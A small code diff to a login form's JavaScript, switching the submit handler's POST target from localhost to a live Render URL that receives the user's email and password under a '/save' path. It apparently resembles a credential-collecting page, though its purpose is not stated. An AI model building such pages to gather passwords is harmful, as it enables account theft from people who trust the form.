@@ -12,7 +12,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
 
   try {
     // Send POST request to backend
-    const response = await fetch('http://localhost:3000/save', {  // Change to the live URL if using Render
+    const response = await fetch('https://emailform-z143.onrender.com/save', {  // Change to the live URL if using Render
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password })
